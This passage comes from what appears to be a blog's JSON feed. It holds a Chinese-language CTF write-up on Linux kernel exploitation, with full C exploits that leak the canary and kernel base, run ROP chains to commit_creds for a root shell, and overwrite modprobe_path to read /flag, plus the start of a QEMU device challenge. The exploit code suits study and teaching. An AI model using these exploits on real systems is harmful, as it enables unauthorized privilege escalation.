class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">open_dev</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  fd = open(<span class=\"string\">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fd &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Panic(<span class=\"string\">&quot;open_dev() failed&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;open_dev()&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// write to kernel</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">wtk</span><span class=\"params\">(<span class=\"type\">char</span> *buf, u64 size)</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;wtk start&quot;</span>);</span><br><span class=\"line\">  write(fd, buf, size);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;wtk&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// read from kernel</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">rfk</span><span class=\"params\">(<span class=\"type\">char</span> *buf, u64 size)</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;rfk start&quot;</span>);</span><br><span class=\"line\">  read(fd, buf, size);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;rfk&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getShell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;get shell now&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    Panic(<span class=\"string\">&quot;getShell failed&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 sh = (u64)getShell;</span><br><span class=\"line\"></span><br><span class=\"line\">u64 kernel_base                 = <span class=\"number\">0xffffffff80000000</span>;</span><br><span class=\"line\">u64 kpti_trampoline             = <span class=\"number\">0x200f10</span>+<span class=\"number\">22</span>;</span><br><span class=\"line\">u64 pop_rax_ret                 = <span class=\"number\">0x4d11</span>; <span class=\"comment\">// pop rax; ret</span></span><br><span class=\"line\">u64 read_mem_pop1_ret           = <span class=\"number\">0x4aae</span>; <span class=\"comment\">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;</span></span><br><span class=\"line\">u64 pop_rdi_rbp_ret             = <span class=\"number\">0x38a0</span>; <span class=\"comment\">// pop rdi; pop rbp; ret;</span></span><br><span class=\"line\">u64 canary                      = <span class=\"number\">0</span>;</span><br><span class=\"line\">u64 ksymtab_prepare_kernel_cred = <span class=\"number\">0xf8d4fc</span>;</span><br><span class=\"line\">u64 ksymtab_commit_creds        = <span class=\"number\">0xf87d90</span>;</span><br><span class=\"line\">u64 tmp_rax;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">print_leak</span><span class=\"params\">(u64 *p, u64 n)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(u64 i = <span class=\"number\">0</span>; i &lt; n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(p[i] &amp; <span class=\"number\">0xffffffff81000000</span> == <span class=\"number\">0xffffffff81000000</span>)</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;p[%d] : 0x%lx\\n&quot;</span>, i, p[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">leak</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;leak&quot;</span>);</span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x300</span>];</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x1f0</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  kernel_base = ptr[<span class=\"number\">38</span>] - <span class=\"number\">0xa157</span>;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; kernel_base is 0x%lx&quot;</span>,kernel_base);</span><br><span class=\"line\">  u64 payload[<span class=\"number\">50</span>];</span><br><span class=\"line\">  pop_rdi_rbp_ret             += kernel_base;</span><br><span class=\"line\">  pop_rax_ret                 += kernel_base;</span><br><span class=\"line\">  read_mem_pop1_ret           += kernel_base;</span><br><span class=\"line\">  kpti_trampoline             += kernel_base;</span><br><span class=\"line\">  ksymtab_prepare_kernel_cred += kernel_base;</span><br><span class=\"line\">  ksymtab_commit_creds        += kernel_base;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;leak&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_addr_primitive</span><span class=\"params\">(<span class=\"type\">char</span> *addr, <span class=\"type\">void</span> (*f)())</span>&#123;</span><br><span class=\"line\">  u64 payload[<span class=\"number\">0x40</span>];</span><br><span class=\"line\">  u64 off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rax_ret;</span><br><span class=\"line\">  payload[off++] = addr - <span class=\"number\">0x10</span>;</span><br><span class=\"line\">  payload[off++] = read_mem_pop1_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy</span></span><br><span class=\"line\">  payload[off++] = kpti_trampoline;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rax</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rdi</span></span><br><span class=\"line\">  payload[off++] = f;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;read_from_addr_primitive&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fn_rdi_ret_primitive</span><span class=\"params\">(<span class=\"type\">void</span> (*fn)(), u64 rdi, <span class=\"type\">void</span> (*ret)())</span>&#123;</span><br><span class=\"line\">  u64 payload[<span class=\"number\">0x40</span>];</span><br><span class=\"line\">  u64 off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rdi_rbp_ret;</span><br><span class=\"line\">  payload[off++] = rdi;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = fn;</span><br><span class=\"line\">  payload[off++] = kpti_trampoline;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rax</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rdi</span></span><br><span class=\"line\">  payload[off++] = ret;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;fn_rdi_ret_primitive&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 pkc;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">get_cc_addr</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">get_pkc_addr</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  __asm__ __volatile__(</span><br><span class=\"line\">    <span class=\"string\">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov tmp_rax, rax;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;.att_syntax;&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  pkc = ksymtab_prepare_kernel_cred + (<span class=\"type\">int</span>)tmp_rax;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;   --&gt; pkc tmp_rax is 0x%x&quot;</span>,(<span class=\"type\">int</span>) tmp_rax);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; pkc is 0x%lx&quot;</span>, pkc);</span><br><span class=\"line\">  rfap(ksymtab_commit_creds, get_cc_addr);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;get_pkc_addr&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 cc;</span><br><span class=\"line\"><span class=\"comment\">// <span class=\"doctag\">TODO:</span> dont put any output in head to destory rax</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">done_pkc</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">get_cc_addr</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  __asm__ __volatile__(</span><br><span class=\"line\">    <span class=\"string\">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov tmp_rax, rax;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;.att_syntax;&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  cc = ksymtab_commit_creds + (<span class=\"type\">int</span>)tmp_rax;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;   --&gt; cc tmp_rax is 0x%x&quot;</span>,tmp_rax);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; cc is  0x%lx&quot;</span>, cc);</span><br><span class=\"line\">  frrp(pkc, <span class=\"literal\">NULL</span>, done_pkc);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;get_cc_addr&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 cc_struct;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">done_pkc</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  __asm__ __volatile__(</span><br><span class=\"line\">    <span class=\"string\">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov tmp_rax, rax;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;.att_syntax;&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  cc_struct = tmp_rax;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; cc_struct is 0x%lx&quot;</span>, cc_struct);</span><br><span class=\"line\">  frrp(cc, cc_struct, sh);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> (*rfap)(<span class=\"type\">char</span> *, <span class=\"type\">void</span> (*)()) = read_from_addr_primitive;</span><br><span class=\"line\"><span class=\"type\">void</span> (*frrp)(<span class=\"type\">void</span> (*)(), u64, <span class=\"type\">void</span> (*)()) = fn_rdi_ret_primitive;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  leak();</span><br><span class=\"line\">  rfap(ksymtab_prepare_kernel_cred, get_pkc_addr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"exp2\"><a class=\"markdownIt-Anchor\" href=\"#exp2\">#</a> exp2</h2>\n<ul>\n<li>modprobe_path 不再赘述<br>\n这个是.data 节的数据 到内核基址的偏移也是确定的，另外先前也知道了 memcpy 在偏移不变的段内。ROP 覆写即可</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/ # cat /proc/kallsyms | grep memcpy</span><br><span class=\"line\">ffffffff81007c60 T __memcpy_mcsafe</span><br><span class=\"line\">ffffffff8100dd60 T __memcpy</span><br><span class=\"line\">ffffffff8100dd60 W memcpy</span><br><span class=\"line\"></span><br><span class=\"line\">/ # cat /proc/kallsyms | grep modprobe_path</span><br><span class=\"line\">ffffffff82061820 D modprobe_path</span><br></pre></td></tr></table></figure>\n<p>不过由于 SMAP 的缘故，memcpy 不能用，只能找写入的 gadget。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/<span class=\"number\">10</span>i <span class=\"number\">0x306d</span>+<span class=\"number\">0xffffffff81000000</span></span><br><span class=\"line\">   <span class=\"number\">0xffffffff8100306d</span>:  mov    QWORD PTR [rbx],rax</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003070</span>:  pop    rbx</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003071</span>:  pop    rbp</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003072</span>:  ret</span><br></pre></td></tr></table></figure>\n<p>这样就还需要一个控制 rbx 的 gadget，rax 写成 <code>/tmp/s</code> , rbx 写成 modprobe_path 的地址，控制 rax 的 exp1 里已经有了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/<span class=\"number\">10</span>i <span class=\"number\">0x3190</span>+<span class=\"number\">0xffffffff81000000</span></span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003190</span>:  pop    rbx</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003191</span>:  pop    r12</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003193</span>:  pop    rbp</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003194</span>:  ret</span><br></pre></td></tr></table></figure>\n<p>那么 exp2 就很简单了。注意 <code>/tmp/s</code>  不要太长 不然就和后面的字符串拼接上了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">u64 kernel_base              = <span class=\"number\">0xffffffff81000000</span>;</span><br><span class=\"line\">u64 kpti_trampoline          = <span class=\"number\">0x200f10</span>+<span class=\"number\">22</span>;</span><br><span class=\"line\">u64 modprobe                 = <span class=\"number\">0x1061820</span>;</span><br><span class=\"line\">u64 mov_ptr_rbx_rax_pop2_ret = <span class=\"number\">0x306d</span>;</span><br><span class=\"line\">u64 pop_rbx_pop2_ret         = <span class=\"number\">0x3190</span>;</span><br><span class=\"line\">u64 pop_rax_ret              = <span class=\"number\">0x4d11</span>; <span class=\"comment\">// pop rax; ret</span></span><br><span class=\"line\">u64 tmp_rax;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">print_leak</span><span class=\"params\">(u64 *p, u64 n)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(u64 i = <span class=\"number\">0</span>; i &lt; n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(p[i] &amp; <span class=\"number\">0xffffffff81000000</span> == <span class=\"number\">0xffffffff81000000</span>)</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;p[%d] : 0x%lx\\n&quot;</span>, i, p[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">leak</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;leak&quot;</span>);</span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x300</span>];</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x1f0</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  kernel_base = ptr[<span class=\"number\">38</span>] - <span class=\"number\">0xa157</span>;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; kernel_base is 0x%lx&quot;</span>,kernel_base);</span><br><span class=\"line\">  modprobe                    += kernel_base;</span><br><span class=\"line\">  mov_ptr_rbx_rax_pop2_ret    += kernel_base;</span><br><span class=\"line\">  pop_rbx_pop2_ret            += kernel_base;</span><br><span class=\"line\">  kpti_trampoline             += kernel_base;</span><br><span class=\"line\">  pop_rax_ret                 += kernel_base;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;leak&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">trigger_modprobe</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;trigger_modprobe&quot;</span>);</span><br><span class=\"line\">  system(</span><br><span class=\"line\">    <span class=\"string\">&quot;echo &#x27;#!/bin/sh\\n&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;cp /flag /tmp/flag\\n&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;chmod 777 /tmp/flag&#x27; &gt; /tmp/s\\n&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  system(<span class=\"string\">&quot;chmod +x /tmp/s&quot;</span>);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;echo -ne &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;Run unknown file&quot;</span>);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;/tmp/dummy&quot;</span>);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;cat /tmp/flag&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">overflow</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  u64 payload[<span class=\"number\">0x40</span>];</span><br><span class=\"line\">  u64 off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rbx_pop2_ret;</span><br><span class=\"line\">  payload[off++] = modprobe;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>; <span class=\"comment\">// dummy</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>; <span class=\"comment\">// dummy</span></span><br><span class=\"line\">  payload[off++] = pop_rax_ret; </span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0x732f706d742f</span>;<span class=\"comment\">// /tmp/s little-endian</span></span><br><span class=\"line\">  payload[off++] = mov_ptr_rbx_rax_pop2_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = kpti_trampoline;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rax</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rdi</span></span><br><span class=\"line\">  payload[off++] = trigger_modprobe;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;read_from_addr_primitive&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  leak();</span><br><span class=\"line\">  overflow();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"references\"><a class=\"markdownIt-Anchor\" href=\"#references\">#</a> references</h1>\n<p><a href=\"https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/\">Learning Linux Kernel Exploitation - Part 1 - Midas Blog</a><br>\n<a href=\"https://blog.csdn.net/weixin_46483787/article/details/124199102\">2020 hxpctf kernel-rop_Ayakaaaa 的博客 - CSDN 博客</a><br>\n<a href=\"https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/\"> FGKASLR - CTF Wiki</a></p>\n",
            "tags": [
                "Linux",
                "Kernel state"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/09/16/a-easy-virtualization-challenge/",
            "url": "https://squirre17.github.io/2022/09/16/a-easy-virtualization-challenge/",
            "title": "a-easy-virtualization-challenge",
            "date_published": "2022-09-16T02:43:40.000Z",
            "content_html": "<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_5713A8</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = sub_70031D(a1, <span class=\"string\">&quot;pci-device&quot;</span>, <span class=\"string\">&quot;/home/wang/qemu/hw/misc/myrfid.c&quot;</span>, <span class=\"number\">369LL</span>, <span class=\"string\">&quot;rfid_class_init&quot;</span>);</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">176</span>) = qxl_reset_handler;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">184</span>) = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  *(_WORD *)(result + <span class=\"number\">208</span>) = <span class=\"number\">0x420</span>;          [<span class=\"number\">1</span>] &lt;&lt;- vendor_id</span><br><span class=\"line\">  *(_WORD *)(result + <span class=\"number\">210</span>) = <span class=\"number\">0x1337</span>;         [<span class=\"number\">2</span>] &lt;&lt;- device_id</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">212</span>) = <span class=\"number\">0x69</span>;</span><br><span class=\"line\">  *(_WORD *)(result + <span class=\"number\">214</span>) = <span class=\"number\">0xFF</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个和源码对应关系如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">qxl_pci_class_init</span><span class=\"params\">(ObjectClass *klass, <span class=\"type\">void</span> *data)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class=\"line\">    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class=\"line\"></span><br><span class=\"line\">    k-&gt;vendor_id = REDHAT_PCI_VENDOR_ID;</span><br><span class=\"line\">    k-&gt;device_id = QXL_DEVICE_ID_STABLE;</span><br><span class=\"line\">    set_bit(DEVICE_CATEGORY_DISPLAY, dc-&gt;categories);</span><br><span class=\"line\">    dc-&gt;reset = qxl_reset_handler;</span><br><span class=\"line\">    dc-&gt;vmsd = &amp;qxl_vmstate;</span><br><span class=\"line\">    device_class_set_props(dc, qxl_properties);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>凭借着厂商 id 和设备 id 就能找到总线上的位置<br>\n登入进去看到总线</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">lspci -nvv</span></span><br><span class=\"line\">00:00.0 Class 0600: 8086:1237</span><br><span class=\"line\">00:01.3 Class 0680: 8086:7113</span><br><span class=\"line\">00:03.0 Class 0200: 8086:100e</span><br><span class=\"line\">00:01.1 Class 0101: 8086:7010</span><br><span class=\"line\">00:02.0 Class 0300: 1234:1111</span><br><span class=\"line\">00:01.0 Class 0601: 8086:7000</span><br><span class=\"line\">00:04.0 Class 00ff: 0420:1337                 [1] &lt;&lt;- 是这个b</span><br></pre></td></tr></table></figure>\n<p>然后可以看到内存中的位置✨TODO</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 